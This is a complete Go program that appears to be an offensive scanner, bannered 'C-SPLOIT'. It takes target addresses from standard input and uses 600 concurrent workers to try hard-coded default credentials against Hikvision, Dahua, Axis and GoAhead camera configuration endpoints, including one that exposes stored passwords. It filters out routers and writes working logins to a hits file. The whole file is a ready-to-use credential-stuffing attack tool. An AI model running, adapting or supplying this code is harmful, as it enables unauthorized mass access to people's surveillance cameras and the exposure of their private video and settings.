package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	WorkerCount = 600
	TaskTimeout = 8 * time.Second
	LogFile     = "hits.txt"
)

var (
	processed uint64
	hits      uint64
	history   sync.Map
)

var cameraTests = map[string]struct {
	Path   string
	Marker string
}{
	"Hikvision": {"/ISAPI/System/deviceInfo", "<model>"},
	"Dahua":     {"/cgi-bin/configManager.cgi?action=getConfig&name=General", "table.General"},
	"Axis":      {"/axis-cgi/admin/param.cgi?action=list", "root.Brand.Brand=AXIS"},
	"GoAhead":   {"/system.ini", "http_password"},
}

var routerBlacklist = []string{"WAN", "PPPoE", "SSID", "Firewall", "Router", "Gateway", "Broadband"}

var defaultCreds = []struct{ User, Pass string }{
	{"admin", "admin"}, {"admin", "12345"}, {"admin", "123456"},
	{"root", "pass"}, {"admin", "P@ssw0rdtcrb"}, {"admin", "tl3411"},
}

func main() {
	client := &http.Client{
		Timeout: TaskTimeout,
		Transport: &http.Transport{
			MaxIdleConns:      WorkerCount,
			DisableKeepAlives: true,
			TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
		},
	}

	jobs := make(chan string, 3000)
	var wg sync.WaitGroup

	go func() {
		for {
			fmt.Printf("\r[C-SPLOIT] Processed: %d | logins: %d | Workers: %d",
				atomic.LoadUint64(&processed), atomic.LoadUint64(&hits), WorkerCount)
			time.Sleep(1 * time.Second)
		}
	}()

	for w := 0; w < WorkerCount; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for target := range jobs {
				runStrictAudit(target, client)
				atomic.AddUint64(&processed, 1)
			}
		}()
	}

	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		target := strings.TrimSpace(scanner.Text())
		if target == "" || !strings.Contains(target, ":") {
			continue
		}
		if _, seen := history.LoadOrStore(target, true); !seen {
			jobs <- target
		}
	}
	close(jobs)
	wg.Wait()
}

func runStrictAudit(target string, client *http.Client) {
	for brand, test := range cameraTests {
		for _, cred := range defaultCreds {
			req, _ := http.NewRequest("GET", "http://"+target+test.Path, nil)
			req.SetBasicAuth(cred.User, cred.Pass)

			resp, err := client.Do(req)
			if err != nil {
				continue
			}

			body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
			resp.Body.Close()
			bodyStr := string(body)

			if strings.Contains(bodyStr, test.Marker) {

				isRouter := false
				for _, word := range routerBlacklist {
					if strings.Contains(bodyStr, word) {
						isRouter = true
						break
					}
				}

				if !isRouter && !strings.Contains(bodyStr, "login.asp") {
					atomic.AddUint64(&hits, 1)
					fmt.Printf("\n\033[32m[DEVICE DETECTED @] %s | %s | %s:%s\033[0m\n", brand, target, cred.User, cred.Pass)

					f, _ := os.OpenFile(LogFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
					fmt.Fprintf(f, "[%s] %s | %s:%s\n", brand, target, cred.User, cred.Pass)
					f.Close()
					return
				}
			}
		}
	}
}
